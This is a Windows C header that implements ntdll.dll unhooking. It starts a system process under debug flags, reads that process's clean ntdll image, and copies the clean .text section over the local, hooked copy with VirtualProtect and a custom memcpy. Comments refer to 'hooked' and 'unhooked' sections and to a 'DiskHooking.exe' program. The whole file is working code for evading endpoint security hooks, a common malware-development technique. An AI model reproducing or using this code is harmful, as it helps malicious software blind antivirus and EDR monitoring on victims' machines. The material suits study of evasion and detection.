#pragma once

#include <Windows.h>

#include "Structs.h"
#include "Debug.h"
#include "Common.h"

#include <stdio.h>
#pragma comment(lib, "libcmt.lib")
#pragma comment(lib, "legacy_stdio_definitions.lib")

void* MyMemcpy(void* dest, const void* src, size_t count) {
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (count--) {
        *d++ = *s++;
    }
    return dest;
}

#define SPRINTA( OUTBUF, SIZE, STR, ... )                                                 \
    if ((OUTBUF) != NULL) {                                                               \
        LPSTR _tmpBuf = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);       \
        if (_tmpBuf != NULL) {                                                            \
            int len = wsprintfA(_tmpBuf, STR, __VA_ARGS__);                               \
            if (len > 0 && len < (int)(SIZE)) {                                           \
                MyMemcpy((OUTBUF), _tmpBuf, len);                                           \
                (OUTBUF)[len] = '\0';                                                     \
            }                                                                             \
            HeapFree(GetProcessHeap(), 0, _tmpBuf);                                       \
        }                                                                                 \
    }


PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

    // Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'DiskHooking.exe')
    // 0x10 is = sizeof(LIST_ENTRY)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    return pLdr->DllBase;
}


// a function that return the size of the local ntdll.dll image
SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule) {

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    return pImgNtHdrs->OptionalHeader.SizeOfImage;
}


BOOL ReadNtdllFromASuspendedProcess(IN LPCSTR lpProcessName, OUT PVOID* ppNtdllBuf) {

    CHAR	cWinPath[MAX_PATH / 2] = { 0 };
    CHAR	cProcessPath[MAX_PATH] = { 0 };

    PVOID	pNtdllModule = FetchLocalNtdllBaseAddress();
    PBYTE	pNtdllBuffer = NULL;
    SIZE_T	sNtdllSize = NULL,
        sNumberOfBytesRead = NULL;

    STARTUPINFOA				Si = { 0 };
    PROCESS_INFORMATION		Pi = { 0 };

    // cleaning the structs (setting elements values to 0)
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // setting the size of the structure
    Si.cb = sizeof(STARTUPINFO);

    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
        PRINTA("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
        goto _EndOfFunc;
    }

    PRINTA("[*] Entering ReadNtdllFromASuspendedProcess()\n");

    PRINTA("[*] lpProcessName = %s\n", lpProcessName ? lpProcessName : "(null)");

    PRINTA("[*] Path: %s\\System32\\%s\n", cWinPath, lpProcessName);

    SPRINTA(cProcessPath, sizeof(cProcessPath), "%s\\System32\\%s", cWinPath, lpProcessName);

    PRINTA("[i] Running : \"%s\" As A Suspended Process... \n", cProcessPath);
    if (!CreateProcessA(
        cProcessPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,		// Substitute of CREATE_SUSPENDED		
        NULL,
        NULL,
        &Si,
        &Pi)) {
        PRINTA("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
        goto _EndOfFunc;
    }
    PRINTA("[+] DONE \n");
    PRINTA("[i] Suspended Process Created With Pid : %d \n", Pi.dwProcessId);


    // allocating enough memory to read ntdll from the remote process
    sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
    if (!sNtdllSize)
        goto _EndOfFunc;
    //pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
    pNtdllBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);

    if (!pNtdllBuffer)
        goto _EndOfFunc;

    // reading ntdll.dll
    if (!ReadProcessMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllSize) {
        PRINTA("[!] ReadProcessMemory Failed with Error : %d \n", GetLastError());
        PRINTA("[i] Read %d of %d Bytes \n", sNumberOfBytesRead, sNtdllSize);
        goto _EndOfFunc;
    }

    *ppNtdllBuf = pNtdllBuffer;

    // terminating the process
    if (DebugActiveProcessStop(Pi.dwProcessId) && TerminateProcess(Pi.hProcess, 0)) {
        PRINTA("[+] Process Terminated \n");
    }

    /*
        if the 'CREATE_SUSPENDED' flag was used, 'DebugActiveProcessStop' is replaced with ResumeThread(Pi.hThread)
    */

_EndOfFunc:
    if (Pi.hProcess)
        CloseHandle(Pi.hProcess);
    if (Pi.hThread)
        CloseHandle(Pi.hThread);
    if (*ppNtdllBuf == NULL)
        return FALSE;
    else
        return TRUE;

}



BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

    PVOID				pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();

    PRINTA("\t[i] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedNtdll);

    // getting the dos header
    PIMAGE_DOS_HEADER	pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // getting the nt headers
    PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;


    PVOID		pLocalNtdllTxt = NULL,	// local hooked text section base address
        pRemoteNtdllTxt = NULL; // the unhooked text section base address
    SIZE_T		sNtdllTxtSize = NULL;	// the size of the text section



    // getting the text section
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

        // the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
        if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
            sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    //---------------------------------------------------------------------------------------------------------------------------


    PRINTA("\t[i] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[i] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[i] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    // small check to verify that all the required information is retrieved
    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
        return FALSE;

    // small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
    if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
        return FALSE;

    //---------------------------------------------------------------------------------------------------------------------------

    PRINTA("[i] Replacing The Text Section ... \n");
    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
        PRINTA("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    MyMemcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
        PRINTA("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    PRINTA("[+] DONE !\n");

    return TRUE;
}
